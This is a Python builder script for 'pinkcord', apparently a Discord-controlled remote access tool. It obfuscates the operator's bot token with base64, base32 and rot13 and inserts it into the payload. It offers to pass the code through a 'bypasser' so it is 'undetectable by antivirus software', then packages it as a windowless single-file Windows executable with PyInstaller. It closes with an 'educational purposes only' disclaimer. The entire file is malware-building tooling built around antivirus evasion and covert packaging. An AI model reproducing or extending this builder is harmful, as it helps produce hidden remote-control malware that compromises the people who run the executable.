import subprocess
import sys
import codecs 
import base64
import platform
import os
asciart = '''
  _____ _____ _   _ _  _______ ____  _____  _____  
 |  __ \_   _| \ | | |/ / ____/ __ \|  __ \|  __ \ 
 | |__) || | |  \| | ' / |   | |  | | |__) | |  | |
 |  ___/ | | | . ` |  <| |   | |  | |  _  /| |  | |
 | |    _| |_| |\  | . \ |___| |__| | | \ \| |__| |
 |_|   |_____|_| \_|_|\_\_____\____/|_|  \_\_____/ 

https://github.com/xanonDev/pinkcord
[!] some functions may not work on linux, so I recommend using windows to run this script
'''
def clear_console():
    if platform.system() == 'Windows':
        os.system('cls')
    else:
        os.system('clear')
clear_console()
print(asciart)
print("Installing required libraries...")
subprocess.check_call([sys.executable, '-m', 'pip', 'install', '-r', 'requirements.txt'])
clear_console()
print(asciart)
print("Libraries installed[*]")
token = input("Enter your Discord bot token: ")
print("Encoding token...")
token = token.encode('utf-8')
token = base64.b64encode(token)
token = base64.b32encode(token)
token = token.decode('utf-8')
token = codecs.encode(token, 'rot13')
print("Token encoded[*]")
print('replacing the token in the pinkcord.py file ....')
with open('pinkcord.py', 'r') as sc:
    content = sc.read()
    content = content.replace("<TOKEN>", token)
with open('pinkcord.py', 'w') as sc:
    sc.write(content)
clear_console()
print(asciart)
print('Do you want to test pinkcord by running it?')
print('1. Yes')
print('2. No')
answer = input("Choice: ")
clear_console()
print(asciart)
if answer == "1":
    if platform.system() == 'Windows':
        subprocess.Popen(['start', 'cmd', '/k', 'py', 'pinkcord.py'], shell=True)
    else:
        subprocess.Popen(['xterm', '-e', 'python', 'pinkcord.py'])
    print('Send !h to your Discord bot. If it responds, it means it\'s working')
    print('If it doesn\'t respond, press ENTER in the new window and try again')
    input('Press ENTER when you finish testing')
clear_console()
print(asciart)
print('Do you want to encode pinkcord to make it undetectable by antivirus software and harder to decompile?')
print('1. Yes')
print('2. No')
answer = input("Choice: ")
if answer == "1":
    print('Encoding pinkcord...')
    with open('pinkcord.py', 'r') as sourcecode:
        with open('to_bypass.txt', 'w') as codefile:
            codefile.write(sourcecode.read())
            subprocess.check_call([sys.executable, 'bypasser.py'])
            codefile.close()
            sourcecode.close()
    print("creating a bypass script...")
    with open('to_bypass.txt', 'r') as codefile:
        encoded_code = codefile.read()
    with open('pinkcord_bypass.py', 'r') as bypass:
        content = bypass.read()
        content = content.replace("<BYPASS>", encoded_code)
    with open('pinkcord_bypass.py', 'w') as bypass:
        bypass.write(content)
    clear_console()
    print(asciart)
    import PyInstaller.__main__
    print("Generating exe file...")
    params = [
            '--onefile',
            '--windowed',
            'pinkcord_bypass.py'
        ]
    PyInstaller.__main__.run(params)
    clear_console()
    print(asciart)
    print("[*] pinkcord_bypass.exe generated in the dist folder")
    print("[!] Remember, this program is for educational purposes only and should not be used for illegal activities")
else:
    clear_console()
    print(asciart)
    import PyInstaller.__main__
    print("Generating exe file...")
    params = [
        '--onefile',
        '--windowed',
        'pinkcord.py'
    ]
    PyInstaller.__main__.run(params)
    clear_console()
    print(asciart)
    print("[*] pinkcord.exe generated in the dist folder")
    print("[!] Remember, this program is for educational purposes only and should not be used for illegal activities")
